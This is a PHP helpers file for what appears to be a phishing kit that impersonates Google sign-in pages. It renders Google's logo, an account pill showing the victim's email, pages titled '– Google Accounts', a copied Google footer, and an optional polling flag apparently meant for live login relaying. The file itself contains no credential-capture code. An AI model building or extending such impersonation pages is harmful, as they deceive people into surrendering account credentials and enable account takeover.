<?php
// helpers.php — Shared HTML shell, Google logo, account pill

function g_logo(): string {
    return '<svg class="g-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
</svg>';
}

function account_pill(string $email): string {
    $e = htmlspecialchars($email);
    return '<a href="index.php" class="account-pill">
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
    <circle cx="12" cy="8" r="4" stroke="#9aa0a6" stroke-width="1.5"/>
    <path d="M4 20c0-4 3.582-7 8-7s8 3 8 7" stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round"/>
  </svg>
  ' . $e . '
  <span class="chevron">&#9660;</span>
</a>';
}

function err_icon(): string {
    return '<svg width="14" height="14" viewBox="0 0 24 24" fill="#f28b82" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="11"/><path d="M12 7v6" stroke="#2d2e30" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17.5" r="1.2" fill="#2d2e30"/></svg>';
}

function page_open(string $title, bool $poll = false): void {
    $poll_script = $poll ? '<script>window.__POLL = true;</script>' : '';
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <meta name="theme-color" content="#202124"/>
  <title>{$title} – Google Accounts</title>
  <link rel="stylesheet" href="style.css"/>
  {$poll_script}
</head>
<body>
<div class="page-wrap">
HTML;
}

function page_close(): void {
    echo <<<HTML
  <footer class="page-footer">
    <div class="footer-lang">English (United States) <span style="font-size:10px">&#9660;</span></div>
    <nav class="footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </nav>
  </footer>
</div>
<script src="script.js"></script>
</body>
</html>
HTML;
}
